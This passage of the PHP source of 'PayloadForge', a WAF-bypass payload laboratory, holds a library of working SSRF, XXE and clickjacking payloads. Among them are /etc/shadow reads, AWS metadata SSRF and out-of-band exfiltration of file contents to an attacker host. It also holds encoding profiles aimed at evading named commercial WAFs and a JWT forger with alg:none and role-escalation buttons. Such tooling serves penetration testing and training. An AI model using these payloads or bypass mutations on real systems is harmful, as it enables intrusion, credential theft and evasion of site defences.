        ["id"=>"ss15","name"=>'DNS rebinding',"payload"=>'http://ATTACKER.com (resolves to 127.0.0.1 after first req)',"tags"=>["dns-rebinding","bypass"],"source"=>"PATT"],
        ["id"=>"ss16","name"=>'Open redirect chain',"payload"=>'https://trusted.com/redirect?url=http://169.254.169.254/',"tags"=>["redirect","bypass"],"source"=>"PATT"],
    ],

    "XXE" => [
        ["id"=>"xx01","name"=>'Basic /etc/passwd read',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',"tags"=>["basic","file-read"],"source"=>"PATT"],
        ["id"=>"xx02","name"=>'/etc/shadow read',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',"tags"=>["creds","file-read"],"source"=>"PATT"],
        ["id"=>"xx03","name"=>'SSRF via XXE',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',"tags"=>["ssrf","aws"],"source"=>"PATT"],
        ["id"=>"xx04","name"=>'Blind OOB exfil',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]><foo>test</foo>',"tags"=>["blind","oob"],"source"=>"PATT"],
        ["id"=>"xx05","name"=>'PHP filter source read',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',"tags"=>["php","source"],"source"=>"PATT"],
        ["id"=>"xx06","name"=>'Windows system.ini read',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>',"tags"=>["windows","file-read"],"source"=>"PATT"],
        ["id"=>"xx07","name"=>'Billion laughs DoS',"payload"=>'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>',"tags"=>["dos","billion-laughs"],"source"=>"PATT"],
        ["id"=>"xx08","name"=>'SVG XXE upload',"payload"=>'<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>',"tags"=>["svg","upload"],"source"=>"PATT"],
        ["id"=>"xx09","name"=>'XInclude attack',"payload"=>'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',"tags"=>["xinclude","bypass"],"source"=>"PATT"],
        ["id"=>"xx10","name"=>'Parameter entity blind',"payload"=>'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://ATTACKER/?x=%file;\'>"> %eval; %exfil;]>',"tags"=>["param","blind","oob"],"source"=>"PATT"],
        ["id"=>"xx11","name"=>'XXE via JSON CT spoof',"payload"=>'Set Content-Type: application/xml then send XXE payload',"tags"=>["json","content-type"],"source"=>"PATT"],
        ["id"=>"xx12","name"=>'XLSX XXE',"payload"=>'[Content_Types].xml: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',"tags"=>["xlsx","office"],"source"=>"PATT"],
    ],

    "Clickjacking" => [
        ["id"=>"cj01","name"=>'Basic iframe embed',"payload"=>'<iframe src="https://TARGET.com" width="800" height="600"></iframe>',"tags"=>["basic","iframe"],"source"=>"PF"],
        ["id"=>"cj02","name"=>'Transparent overlay PoC',"payload"=>'<style>iframe{opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%}</style><iframe src="https://TARGET.com"></iframe><button style="position:absolute;top:200px;left:200px">CLICK ME</button>',"tags"=>["transparent","ui-redress"],"source"=>"PF"],
        ["id"=>"cj03","name"=>'Form hijack PoC',"payload"=>"<style>body{margin:0}#v{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:999}</style><iframe id='v' src='https://TARGET.com/delete-account'></iframe>","tags"=>["form","hijack"],"source"=>"PF"],
        ["id"=>"cj04","name"=>'Detect missing header',"payload"=>'curl -I https://TARGET.com | grep -i x-frame',"tags"=>["detect","headers"],"source"=>"PF"],
        ["id"=>"cj05","name"=>'CSP frame-ancestors fix',"payload"=>"Content-Security-Policy: frame-ancestors 'none'","tags"=>["csp","mitigation"],"source"=>"PF"],
        ["id"=>"cj06","name"=>'Drag & drop exfil',"payload"=>'<style>iframe{position:absolute;width:400px;height:400px;opacity:0}</style><iframe src="https://TARGET.com/drafts"></iframe>',"tags"=>["drag-drop","exfil"],"source"=>"PATT"],
        ["id"=>"cj07","name"=>'Double frame bypass',"payload"=>'<iframe><iframe src="https://TARGET.com"></iframe></iframe>',"tags"=>["double-frame","bypass"],"source"=>"PATT"],
        ["id"=>"cj08","name"=>'X-Frame-Options DENY',"payload"=>'X-Frame-Options: DENY',"tags"=>["mitigation","header"],"source"=>"PF"],
    ],

];

// ── WAF PROFILES ─────────────────────────────────────────────────────────────
$WAF_PROFILES = [
    "Cloudflare"  => ["url_encode","case_alternation","html_entity","unicode_escape"],
    "ModSecurity" => ["double_url_encode","null_byte","sql_comment","hex_encode"],
    "AWS WAF"     => ["base64","html_entity","tab_substitute","newline_inject"],
    "Akamai"      => ["unicode_escape","double_url_encode","case_alternation","null_byte"],
    "F5 BIG-IP"   => ["hex_encode","html_entity","tab_substitute","url_encode"],
    "Imperva"     => ["double_url_encode","html_hex","case_alternation","tab_substitute"],
    "Generic"     => ["url_encode","base64","html_entity","hex_encode"],
];

// ── MUTATION ENGINE ───────────────────────────────────────────────────────────
function mutate(string $p, string $type): string {
    switch ($type) {
        case "url_encode":        return rawurlencode($p);
        case "double_url_encode": return rawurlencode(rawurlencode($p));
        case "html_entity":       return htmlspecialchars($p, ENT_QUOTES|ENT_HTML5, 'UTF-8');
        case "base64":            return base64_encode($p);
        case "hex_encode":
            return implode('', array_map(fn($c) => '%'.strtoupper(bin2hex($c)), str_split($p)));
        case "unicode_escape":
            $r='';
            $len = strlen($p);
            for($i=0; $i<$len; $i++){
                $byte = ord($p[$i]);
                if($byte < 0x80){
                    $r .= sprintf('\u%04x', $byte);
                } elseif($byte < 0xE0){
                    $code = (($byte & 0x1F) << 6) | (ord($p[++$i]) & 0x3F);
                    $r .= sprintf('\u%04x', $code);
                } elseif($byte < 0xF0){
                    $code = (($byte & 0x0F) << 12) | ((ord($p[++$i]) & 0x3F) << 6) | (ord($p[++$i]) & 0x3F);
                    $r .= sprintf('\u%04x', $code);
                } else {
                    $code = (($byte & 0x07) << 18) | ((ord($p[++$i]) & 0x3F) << 12) | ((ord($p[++$i]) & 0x3F) << 6) | (ord($p[++$i]) & 0x3F);
                    $r .= sprintf('\U%08x', $code);
                }
            }
            return $r;
        case "case_alternation":
            $r=''; foreach(str_split($p) as $i=>$c) $r.=$i%2===0?strtolower($c):strtoupper($c); return $r;
        case "null_byte":      return $p.'%00';
        case "sql_comment":    return str_replace(' ','/**/',$p);
        case "tab_substitute": return str_replace(' ','%09',$p);
        case "newline_inject": return str_replace(' ','%0a',$p);
        case "json_unicode":
            $r='';
            $len = strlen($p);
            for($i=0; $i<$len; $i++){
                $byte = ord($p[$i]);
                if($byte < 0x80){
                    $r .= $p[$i];
                } elseif($byte < 0xE0){
                    $code = (($byte & 0x1F) << 6) | (ord($p[++$i]) & 0x3F);
                    $r .= sprintf('\u%04x', $code);
                } elseif($byte < 0xF0){
                    $code = (($byte & 0x0F) << 12) | ((ord($p[++$i]) & 0x3F) << 6) | (ord($p[++$i]) & 0x3F);
                    $r .= sprintf('\u%04x', $code);
                } else {
                    $code = (($byte & 0x07) << 18) | ((ord($p[++$i]) & 0x3F) << 12) | ((ord($p[++$i]) & 0x3F) << 6) | (ord($p[++$i]) & 0x3F);
                    $r .= sprintf('\U%08x', $code);
                }
            }
            return $r;
        case "html_hex":
            return implode('', array_map(fn($c)=>'&#x'.strtoupper(bin2hex($c)).';', str_split($p)));
        default: return $p;
    }
}

$MUTATION_LABELS = [
    "url_encode"        => "URL Encode",
    "double_url_encode" => "Double URL Encode",
    "html_entity"       => "HTML Entity",
    "base64"            => "Base64",
    "hex_encode"        => "Hex Encode",
    "unicode_escape"    => "Unicode Escape",
    "case_alternation"  => "Case Alternation",
    "null_byte"         => "Null Byte Inject",
    "sql_comment"       => "SQL Comment Break",
    "tab_substitute"    => "Tab Substitute",
    "newline_inject"    => "Newline Inject",
    "json_unicode"      => "JSON Unicode",
    "html_hex"          => "HTML Hex Entities",
];

// ── INPUT VALIDATION ─────────────────────────────────────────────────────────
$activeCategory = $_GET['cat'] ?? 'XSS';
if (!array_key_exists($activeCategory, $PAYLOADS)) $activeCategory = 'XSS';

$_rawTab  = $_GET['tab'] ?? 'library';
$activeTab = in_array($_rawTab, ['library','custom','mutations'], true) ? $_rawTab : 'library';

$search = strip_tags(trim(substr($_GET['search'] ?? '', 0, 100)));

$_rawId   = $_GET['pid'] ?? '';
$selectedId = preg_match('/^[a-zA-Z0-9_-]{1,20}$/', $_rawId) ? $_rawId : '';
$customPayload   = '';
$selectedPayload = null;
$mutationResults = [];
$selectedMutations = [];
$activeWaf       = '';

foreach ($PAYLOADS as $list) {
    foreach ($list as $p) {
        if ($p['id'] === $selectedId) { $selectedPayload=$p; $customPayload=$p['payload']; break 2; }
    }
}

if ($_SERVER['REQUEST_METHOD']==='POST') {
    $customPayload = str_replace("\0", '', substr($_POST['custom_payload'] ?? '', 0, 2000));
    $_rawMutations = (array)($_POST['mutations'] ?? array_keys($MUTATION_LABELS));
    $selectedMutations = array_values(array_filter($_rawMutations, fn($m) => isset($MUTATION_LABELS[$m])));
    if (empty($selectedMutations)) $selectedMutations = array_keys($MUTATION_LABELS);
    $_rawWaf = $_POST['waf_profile'] ?? '';
    $activeWaf = array_key_exists($_rawWaf, $WAF_PROFILES) ? $_rawWaf : '';
    $activeTab = 'mutations';
    foreach ($selectedMutations as $m) {
        if (isset($MUTATION_LABELS[$m])) {
            $mutationResults[] = ['type'=>$m,'label'=>$MUTATION_LABELS[$m],
                'result'=>(function() use($customPayload,$m){ try{return mutate($customPayload,$m);}catch(\Throwable $e){return '[error]';} })()];
        }
    }
    if (isset($_POST['export_format'])) {
        $fmt = $_POST['export_format'];
        if (!in_array($fmt, ['txt','json'], true)) $fmt = '';
        if ($fmt === 'txt') {
            header('Content-Type: text/plain');
            header('Content-Disposition: attachment; filename="payloads.txt"');
            foreach ($mutationResults as $r) echo "# {$r['label']}\n{$r['result']}\n\n";
            exit;
        } elseif ($fmt === 'json') {
            header('Content-Type: application/json');
            header('Content-Disposition: attachment; filename="payloads.json"');
            echo json_encode($mutationResults, JSON_PRETTY_PRINT); exit;
        }
    }
}

$CATEGORY_COLORS = [
    'XSS'=>'#ff4444','SQLi'=>'#ff8800','SSTI'=>'#ffcc00','LFI'=>'#00ccff',
    'IDOR'=>'#cc44ff','CmdInj'=>'#ff6644','CORS'=>'#44aaff','JWT'=>'#ffd700',
    'LDAP'=>'#ff44aa','NoSQL'=>'#44ff88','SSI'=>'#ff9944','SSRF'=>'#44ddff',
    'XXE'=>'#dd44ff','Clickjacking'=>'#ff4488',
];
$activeColor = $CATEGORY_COLORS[$activeCategory];
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
$filteredPayloads = array_values(array_filter($PAYLOADS[$activeCategory], function($p) use ($search) {
    if($search==='') return true;
    $sl=strtolower($search);
    return str_contains(strtolower($p['name']),$sl) || !empty(array_filter($p['tags'],fn($t)=>str_contains($t,$sl)));
}));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayloadForge v3 — WAF Bypass Laboratory</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#000;--bg1:#050505;--bg2:#0a0a0a;--border:#111;--border2:#1a1a1a;--border3:#252525;--text:#c8c8c8;--dim:#444;--xx:#222;--green:#00ff41;--gg:#00ff4133;--red:#ff4444;--orange:#ff8800;--font:'Share Tech Mono',monospace;--head:'Orbitron',monospace}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font);overflow-x:hidden}
::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--border3);border-radius:2px}
#matrix{position:fixed;inset:0;opacity:.06;pointer-events:none;z-index:0}
#app{position:relative;z-index:1;max-width:1480px;margin:0 auto;padding:0 16px;min-height:100vh;display:flex;flex-direction:column}
header{display:flex;align-items:flex-start;justify-content:space-between;padding:18px 0 14px;border-bottom:1px solid var(--border);gap:12px;flex-wrap:wrap}
.logo{display:flex;align-items:center;gap:12px;flex-shrink:0}
.logo-icon{width:38px;height:38px;background:var(--green);border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 18px var(--gg);font-size:18px;color:#000}
.logo-title{font-family:var(--head);font-size:20px;letter-spacing:4px;color:var(--green);text-shadow:0 0 14px #00ff4166}
.logo-title span{color:var(--red)}
.logo-sub{font-size:9px;color:var(--dim);letter-spacing:3px;margin-top:3px}
.cat-tabs{display:flex;gap:5px;flex-wrap:wrap;max-width:860px;justify-content:flex-end}
.cat-btn{padding:5px 11px;border-radius:3px;cursor:pointer;font-family:var(--font);font-size:11px;letter-spacing:1px;transition:all .15s;text-decoration:none;display:inline-block}
.body-grid{display:grid;grid-template-columns:310px 1fr;flex:1}
aside{border-right:1px solid var(--border);padding:14px 12px 16px 0;display:flex;flex-direction:column}
.search-wrap{position:relative;margin-bottom:10px}
.search-wrap input{width:100%;background:var(--bg2);border:1px solid var(--border2);border-radius:4px;padding:9px 9px 9px 34px;color:#888;font-family:var(--font);font-size:13px;outline:none}
.search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--border3);font-size:13px}
.sidebar-meta{font-size:11px;color:var(--dim);letter-spacing:2px;margin-bottom:8px}
.payload-list{display:flex;flex-direction:column;gap:4px;overflow-y:auto;flex:1}
.payload-card{padding:8px 10px;border-radius:4px;cursor:pointer;border:1px solid var(--border);border-left:3px solid var(--border2);background:var(--bg1);transition:all .12s;text-decoration:none;display:block}
.payload-card:hover{border-color:var(--border3)}
.pname{font-size:12px;color:var(--text);margin-bottom:3px;display:flex;align-items:center;justify-content:space-between;gap:6px}
.sbadge{font-size:9px;padding:1px 5px;border-radius:2px;letter-spacing:1px;flex-shrink:0}
.spatt{border:1px solid #00ff4144;color:#00ff4188;background:#00ff4108}
.spf{border:1px solid #ff880044;color:#ff880088;background:#ff880008}
.ppreview{font-size:10px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:4px}
.tags{display:flex;gap:4px;flex-wrap:wrap}
.tag{font-size:9px;padding:1px 4px;border-radius:2px;border:1px solid var(--border2);color:var(--dim);letter-spacing:1px}
main{padding:14px 0 16px 18px;overflow-y:auto;display:flex;flex-direction:column}
.tab-nav{display:flex;border-bottom:1px solid var(--border);margin-bottom:16px}
.tab-btn{padding:9px 22px;background:transparent;border:none;border-bottom:2px solid transparent;color:var(--dim);cursor:pointer;font-family:var(--font);font-size:14px;letter-spacing:2px;transition:all .15s;text-decoration:none;display:inline-block}
.tab-btn.active{color:var(--green);border-bottom-color:var(--green)}
.lib-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.lib-card{background:var(--bg1);border:1px solid var(--border);border-radius:6px;padding:12px 13px;cursor:pointer;transition:all .15s;text-decoration:none;display:block}
.lname{font-size:13px;color:var(--text);margin-bottom:6px;display:flex;align-items:center;justify-content:space-between;gap:6px}
.lib-payload{background:var(--bg2);border:1px solid var(--border);border-radius:3px;padding:7px 10px;font-size:12px;margin-bottom:6px;word-break:break-all;font-family:var(--font)}
.slabel{font-size:13px;color:var(--dim);letter-spacing:2px;display:block;margin-bottom:7px}
textarea{width:100%;background:var(--bg1);border:1px solid var(--border2);border-radius:4px;padding:12px;color:var(--green);font-size:14px;font-family:var(--font);resize:vertical;outline:none;margin-bottom:14px;box-shadow:inset 0 0 20px rgba(0,255,65,.02)}
textarea::placeholder{color:var(--border3)}
.chip-group{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:13px}
.chip{padding:6px 13px;border-radius:3px;cursor:pointer;font-family:var(--font);font-size:12px;letter-spacing:1px;transition:all .13s;border:1px solid var(--border2);background:var(--bg1);color:var(--dim)}
.chip:hover{border-color:var(--border3);color:var(--text)}
.chip.aw{border-color:var(--green);background:rgba(0,255,65,.05);color:var(--green)}
.chip.am{border-color:var(--orange);background:rgba(255,136,0,.05);color:var(--orange)}
.chip.cc{border-style:dashed}
.gen-btn{padding:11px 28px;background:var(--green);border:none;color:#000;font-size:15px;font-weight:700;letter-spacing:3px;cursor:pointer;border-radius:4px;font-family:var(--font);box-shadow:0 0 22px rgba(0,255,65,.25);transition:all .15s}
.gen-btn:hover{box-shadow:0 0 30px rgba(0,255,65,.4);transform:translateY(-1px)}
.waf-note{font-size:12px;color:var(--dim);margin-bottom:12px;min-height:14px}
.mut-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.mut-count{font-size:13px;color:var(--dim);letter-spacing:2px}
.export-btns{display:flex;gap:7px}
.exp-btn{padding:5px 13px;border:1px solid var(--border2);background:var(--bg1);color:var(--dim);font-size:12px;font-family:var(--font);border-radius:3px;letter-spacing:1px;transition:all .13s;text-decoration:none;display:inline-flex;align-items:center;gap:5px;cursor:pointer}
.exp-btn:hover{border-color:var(--border3);color:var(--text)}
.base-label{font-size:13px;color:var(--xx);margin-bottom:12px;letter-spacing:1px;word-break:break-all}
.base-label span{color:var(--green)}
.mut-list{display:flex;flex-direction:column;gap:5px}
.mut-row{background:var(--bg1);border:1px solid var(--border);border-radius:4px;padding:10px 14px;display:grid;grid-template-columns:180px 1fr auto;align-items:center;gap:12px}
.mut-lbl{font-size:12px;color:var(--orange);letter-spacing:1px}
.mut-val{font-size:12px;color:var(--green);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:pointer}
.copy-btn{background:transparent;border:1px solid var(--border2);color:var(--dim);cursor:pointer;padding:5px 12px;font-size:12px;border-radius:3px;font-family:var(--font);letter-spacing:1px;white-space:nowrap;transition:all .13s}
.copy-btn:hover{border-color:var(--green);color:var(--green)}
.empty{text-align:center;padding:70px 20px;color:var(--border3)}
.empty .ei{font-size:42px;margin-bottom:12px}
.empty p{font-size:13px;letter-spacing:2px}
.empty small{font-size:11px;color:var(--border2);margin-top:4px;display:block}
.credit{font-size:11px;color:var(--border3);letter-spacing:1px;padding:14px 0;border-top:1px solid var(--border);text-align:center;margin-top:auto}
.credit a{color:#00ff4155;text-decoration:none}.credit a:hover{color:var(--green)}
/* JWT EDITOR */
.jwt-editor{display:flex;flex-direction:column;gap:14px}
.jp{background:var(--bg1);border:1px solid var(--border2);border-radius:6px;padding:16px}
.jpt{font-size:11px;color:var(--dim);letter-spacing:2px;margin-bottom:10px}
.jta{width:100%;background:var(--bg2);border:1px solid var(--border2);border-radius:4px;padding:10px;color:var(--green);font-size:12px;font-family:var(--font);resize:vertical;outline:none;min-height:70px;margin-bottom:0}
.jrow{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.jbadge{padding:3px 10px;border-radius:12px;font-size:10px;letter-spacing:1px;display:inline-block;margin-right:6px}
.jhs{border:1px solid #ffd70066;color:#ffd700;background:#ffd70011}
.jrs{border:1px solid #44aaffaa;color:#44aaff;background:#44aaff11}
.jnone{border:1px solid #ff444488;color:#ff4444;background:#ff444411}
.jbtn{padding:7px 18px;border:1px solid var(--green);background:transparent;color:var(--green);font-family:var(--font);font-size:11px;letter-spacing:2px;border-radius:4px;cursor:pointer;transition:all .15s}
.jbtn:hover{background:rgba(0,255,65,.08)}
.jforged{background:var(--bg2);border:1px solid var(--green);border-radius:4px;padding:10px;font-size:11px;color:var(--green);word-break:break-all;font-family:var(--font);margin-top:10px;display:none}
.jatk{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:8px}
.jatkbtn{padding:7px 11px;border:1px solid var(--border2);background:var(--bg1);color:var(--dim);font-family:var(--font);font-size:11px;letter-spacing:1px;border-radius:3px;cursor:pointer;transition:all .13s;text-align:left}
.jatkbtn:hover{border-color:var(--red);color:var(--red)}
/* CLICKJACKING */
.cj-wrap{display:flex;flex-direction:column;gap:14px}
.cj-row{display:flex;gap:10px;align-items:center}
.cj-inp{flex:1;background:var(--bg1);border:1px solid var(--border2);border-radius:4px;padding:9px 13px;color:var(--green);font-family:var(--font);font-size:13px;outline:none}
.cj-inp:focus{border-color:var(--green)}
.cj-btn{padding:9px 20px;background:var(--red);border:none;color:#fff;font-family:var(--font);font-size:12px;letter-spacing:2px;border-radius:4px;cursor:pointer;white-space:nowrap;transition:all .15s}
.cj-btn:hover{box-shadow:0 0 16px #ff444466}
.cj-box{background:var(--bg1);border:1px solid var(--border2);border-radius:6px;overflow:hidden}
.cj-bar{padding:8px 13px;font-size:11px;letter-spacing:1px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border2)}
.cj-vuln{color:#ff4444;border-bottom-color:#ff444433}
.cj-safe{color:#00ff41;border-bottom-color:#00ff4133}
.cj-ifwrap{position:relative;background:#0a0a0a}
.cj-iframe{width:100%;height:480px;border:none;display:block}
.cj-overlay{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;display:none}
.cj-fake{position:absolute;top:38%;left:50%;transform:translate(-50%,-50%);background:#ff4444;color:#fff;padding:15px 30px;font-size:17px;border-radius:8px;cursor:pointer;font-weight:bold;pointer-events:auto;box-shadow:0 0 30px #ff444499;animation:cjp 1.5s infinite}
@keyframes cjp{0%,100%{box-shadow:0 0 30px #ff444499}50%{box-shadow:0 0 60px #ff4444cc}}
.cj-igrid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.cj-card{background:var(--bg2);border:1px solid var(--border2);border-radius:4px;padding:12px}
.cj-card h4{font-size:11px;letter-spacing:2px;margin-bottom:7px}
.cj-card p{font-size:11px;color:var(--dim);line-height:1.7}
@media(max-width:900px){.body-grid{grid-template-columns:1fr}aside{border-right:none;border-bottom:1px solid var(--border);padding:12px 0}main{padding:14px 0}.lib-grid{grid-template-columns:1fr}.mut-row{grid-template-columns:120px 1fr auto}.jrow{grid-template-columns:1fr}.jatk{grid-template-columns:1fr}.cj-igrid{grid-template-columns:1fr}}
@media(max-width:600px){.logo-title{font-size:16px}.mut-row{grid-template-columns:1fr auto}.mut-lbl{display:none}}
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div id="app">

<header>
  <div class="logo">
    <div class="logo-icon">&#x26A1;</div>
    <div>
      <div class="logo-title">PAYLOAD<span>FORGE</span></div>
      <div class="logo-sub">WAF BYPASS LABORATORY v3.0.0</div>
    </div>
  </div>
  <div class="cat-tabs">
    <?php foreach($PAYLOADS as $cat=>$_):
      $c=$CATEGORY_COLORS[$cat]; $a=$cat===$activeCategory;
      $s=$a?"border:1px solid {$c};background:{$c}18;color:{$c};box-shadow:0 0 8px {$c}44;"
           :"border:1px solid var(--border2);color:var(--dim);";
    ?>
    <a href="?cat=<?=h($cat)?>&tab=library" class="cat-btn" style="<?=$s?>"><?=h($cat)?></a>
    <?php endforeach; ?>
  </div>
</header>

<div class="body-grid">
<aside>
  <form method="get">
    <input type="hidden" name="cat" value="<?=h($activeCategory)?>">
    <input type="hidden" name="tab" value="library">
    <div class="search-wrap">
      <span class="search-icon">&#x1F50D;</span>
      <input type="text" name="search" value="<?=h($search)?>" placeholder="Search payloads, tags..." oninput="this.form.submit()">
    </div>
  </form>
  <div class="sidebar-meta"><?=count($filteredPayloads)?>/<?=count($PAYLOADS[$activeCategory])?> &mdash; <?=h($activeCategory)?></div>
  <div class="payload-list">
    <?php foreach($filteredPayloads as $p):
      $ia=$p['id']===$selectedId; $c=$CATEGORY_COLORS[$activeCategory];
      $bs=$ia?"border-color:{$c};border-left-color:{$c};background:{$c}08;":'';
    ?>
    <a href="?cat=<?=h($activeCategory)?>&pid=<?=h($p['id'])?>&tab=custom"
       class="payload-card<?=$ia?' active':''?>" style="<?=$bs?>">
      <div class="pname"<?=$ia?" style=\"color:{$c}\"":''?>><?=h($p['name'])?>
        <span class="sbadge <?=$p['source']==='PATT'?'spatt':'spf'?>"><?=h($p['source'])?></span>
      </div>
      <div class="ppreview"><?=h($p['payload'])?></div>
      <div class="tags">
        <?php foreach($p['tags'] as $t): ?>
        <span class="tag" style="border-color:<?=$c?>33;color:<?=$c?>66;"><?=h($t)?></span>
        <?php endforeach; ?>
      </div>
    </a>
    <?php endforeach; ?>
  </div>
</aside>

<main>
  <div class="tab-nav">
    <?php foreach(['library','custom','mutations'] as $tab): ?>
    <a href="?cat=<?=h($activeCategory)?>&tab=<?=$tab?><?=$selectedId?'&pid='.h($selectedId):''?>"
       class="tab-btn<?=$activeTab===$tab?' active':''?>"><?=strtoupper($tab)?></a>
    <?php endforeach; ?>
  </div>

  <?php if($activeTab==='library'): ?>
  <div>
    <div style="margin-bottom:16px;">
      <h2 style="font-family:var(--head);font-size:14px;color:<?=$activeColor?>;letter-spacing:3px;margin-bottom:5px;"><?=h($activeCategory)?> PAYLOADS</h2>
      <p style="font-size:11px;color:var(--dim);">
        Click a payload to edit &amp; mutate. &nbsp;
        <span style="color:#00ff4155;">&#x25A0; PATT</span> = PayloadsAllTheThings &nbsp;
        <span style="color:#ff880055;">&#x25A0; PF</span> = PayloadForge original
      </p>
    </div>
    <div class="lib-grid">
      <?php foreach($PAYLOADS[$activeCategory] as $p): ?>
      <a href="?cat=<?=h($activeCategory)?>&pid=<?=h($p['id'])?>&tab=custom" class="lib-card"
         onmouseover="this.style.borderColor='<?=$activeColor?>66'" onmouseout="this.style.borderColor='var(--border)'">
        <div class="lname"><?=h($p['name'])?>
          <span class="sbadge <?=$p['source']==='PATT'?'spatt':'spf'?>"><?=h($p['source'])?></span>
        </div>
        <div class="lib-payload" style="color:<?=$activeColor?>;"><?=h($p['payload'])?></div>
        <div class="tags"><?php foreach($p['tags'] as $t): ?><span class="tag"><?=h($t)?></span><?php endforeach; ?></div>
      </a>
      <?php endforeach; ?>
    </div>
  </div>

  <?php elseif($activeTab==='custom'): ?>

  <?php if($activeCategory==='JWT'): ?>
  <div class="jwt-editor">
    <div class="jp">
      <div class="jpt">&#x1F511; JWT DECODER / FORGER</div>
      <label class="slabel">PASTE JWT TOKEN</label>
      <textarea class="jta" id="jwtInput" rows="3" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.signature"><?=h($customPayload)?></textarea>
      <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
        <button type="button" class="jbtn" onclick="decodeJwt()">&#x2193; DECODE</button>
        <div id="jwtAlgBadge"></div>
      </div>
    </div>
    <div class="jrow">
      <div class="jp">
        <div class="jpt">HEADER</div>
        <textarea class="jta" id="jwtHeader" rows="5" placeholder='{"alg":"HS256","typ":"JWT"}'></textarea>
      </div>
      <div class="jp">
        <div class="jpt">PAYLOAD / CLAIMS</div>
        <textarea class="jta" id="jwtPayload" rows="5" placeholder='{"sub":"user","role":"user","iat":1700000000}'></textarea>
      </div>
    </div>
    <div class="jp">
      <div class="jpt">&#x26A1; QUICK ATTACKS</div>
      <div class="jatk">
        <button type="button" class="jatkbtn" onclick="jwtAttack('algnone')">&#x1F534; Set alg: none (unsigned)</button>
        <button type="button" class="jatkbtn" onclick="jwtAttack('admin')">&#x1F534; Escalate role to admin</button>
        <button type="button" class="jatkbtn" onclick="jwtAttack('exp')">&#x1F534; Remove expiry (exp: 9999999999)</button>
        <button type="button" class="jatkbtn" onclick="jwtAttack('isadmin')">&#x1F534; Inject isAdmin: true</button>
        <button type="button" class="jatkbtn" onclick="jwtAttack('kidnull')">&#x1F534; kid: ../../dev/null traversal</button>
        <button type="button" class="jatkbtn" onclick="jwtAttack('kidsqli')">&#x1F534; kid: SQL injection</button>
      </div>
    </div>
    <div class="jp">
      <div class="jpt">FORGE TOKEN</div>
      <p style="font-size:11px;color:var(--dim);margin-bottom:12px;">Rebuilds token with modified header/payload. Signature will be <span style="color:#ff4444">INVALID</span> unless the server accepts alg:none or you have the secret.</p>
      <div style="display:flex;gap:9px;flex-wrap:wrap;">
        <button type="button" class="jbtn" onclick="forgeJwt(false)">&#x26A1; FORGE (keep sig)</button>
        <button type="button" class="jbtn" onclick="forgeJwt(true)" style="border-color:#ff4444;color:#ff4444;">&#x1F534; FORGE alg:none</button>
        <button type="button" class="jbtn" onclick="copyForged()" style="border-color:#ffd700;color:#ffd700;">&#x2193; COPY TOKEN</button>
      </div>
      <div class="jforged" id="jwtForged"></div>
    </div>
  </div>

  <?php elseif($activeCategory==='Clickjacking'): ?>
  <div class="cj-wrap">
    <div>
      <h3 style="font-family:var(--head);font-size:12px;color:#ff4488;letter-spacing:3px;margin-bottom:8px;">CLICKJACKING DEMO TOOL</h3>
      <p style="font-size:11px;color:var(--dim);line-height:1.8;">
        Enter a domain to test if it can be embedded in an iframe.<br>
